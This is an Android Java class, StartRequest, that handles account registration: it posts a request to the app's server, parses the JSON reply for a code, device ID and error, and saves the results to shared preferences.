package com.inet.android.request;

import java.io.IOException;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.widget.Toast;

import com.inet.android.utils.DialogShower;
import com.inet.android.utils.Logging;

/**
 * Start request class
 * 
 * @author johny homicide
 * 
 */
public class StartRequest extends DefaultRequest {
	private final String LOG_TAG = StartRequest.class.getSimpleName()
			.toString();
	Context mContext;
	SharedPreferences sp;

	public StartRequest(Context ctx) {
		super(ctx);
		this.mContext = ctx;
		sp = PreferenceManager.getDefaultSharedPreferences(ctx);
		sp.registerOnSharedPreferenceChangeListener(prefListener);
	}

	SharedPreferences.OnSharedPreferenceChangeListener prefListener = new SharedPreferences.OnSharedPreferenceChangeListener() {
		public void onSharedPreferenceChanged(SharedPreferences prefs,
				String key) {
			Logging.doLog(LOG_TAG, "prefs make");
			if (key.equals("account")) {
				Logging.doLog(LOG_TAG, prefs.getString("account", "-1"));
				if (prefs.getString("account", "account").equals("account")) {
					Logging.doLog(LOG_TAG, "prefs make: account");
					Toast.makeText(mContext, "Account number incorrect!",
							Toast.LENGTH_LONG).show();
					Intent intent = new Intent("android.intent.action.MAIN");
					intent.setClass(mContext, DialogShower.class);
					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					intent.putExtra("text", "Hello!");
					mContext.startActivity(intent);
				} else {
					JSONObject jsonObject = new JSONObject();
					try {
						jsonObject.put("account",
								sp.getString("account", "account"));
						jsonObject.put("imei", sp.getString("imei", "imei"));
						jsonObject.put("model", sp.getString("model", "0000"));
					} catch (JSONException e) {
						e.printStackTrace();
					}
					RequestList.sendRequestForFirstToken(mContext);		
				}
			}
		}
	};

	@Override
	public void sendRequest(String str) {
		if (!str.equals(" ")) {
			RequestTask srt = new RequestTask();
			srt.execute(str);
		} else {
			Logging.doLog(LOG_TAG, "str = null", "str = null");

		}
	}

	class RequestTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}
	}

	@Override
	protected void sendPostRequest(String postRequest) {
		String str = null;
		try {
			Logging.doLog(LOG_TAG, postRequest, postRequest);

			str = Caller.doMake(postRequest,
					sp.getString("access_first_token", ""), ConstantRequest.INITIAL_LINK, true,
					null, mContext);
		} catch (IOException e) {
			e.printStackTrace();

		}
		if (str != null && str.length() > 3) 
			getRequestData(str);
		 else {
			Logging.doLog(LOG_TAG,
					"ответа от сервера нет или статус ответа плох",
					"ответа от сервера нет или статус ответа плох");
		}
	}

	@Override
	protected void getRequestData(String string) {
		Logging.doLog(LOG_TAG, "getResponseData: " + string,
				"getResponseData: " + string);

		Editor ed = sp.edit();

		JSONObject jsonObject = null;
		try {
			jsonObject = new JSONObject(string);
		} catch (JSONException e) {
			if (string == null) {
				Logging.doLog(LOG_TAG, "json null", "json null");
			}
			return;
		}

		String str = null;
		try {
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			e.printStackTrace();
		}
		if (str != null) {
			ed.putString("code_initial", str);
		} else {
			ed.putString("code_initial", "code");
		}

		if (str.equals("1")) {
			sp.unregisterOnSharedPreferenceChangeListener(prefListener);
			try {
				str = jsonObject.getString("device");
			} catch (JSONException e) {
				e.printStackTrace();
			}
			if (str != null) {
				ed.putString("device", str);
				ed.commit();
				RequestList.sendCheckRequest(mContext);
			} else {
				ed.putString("device", "device");
			}
		}

		if (str.equals("0")) {
			try {
				str = jsonObject.getString("error");
			} catch (JSONException e) {
				str = null;
			}
			if (str != null) {
				ed.putString("error_initial", str);
			} else {
				ed.putString("error_initial", "error");
			}
			if (str.equals("0")) {
				Logging.doLog(LOG_TAG, "incorrect account number",
						"incorrect account number");
				ed.putString("account", "account");
			}
		}

		ed.commit();
	}

	@Override
	public void sendRequest(int request) {
		// TODO Auto-generated method stub

	}
}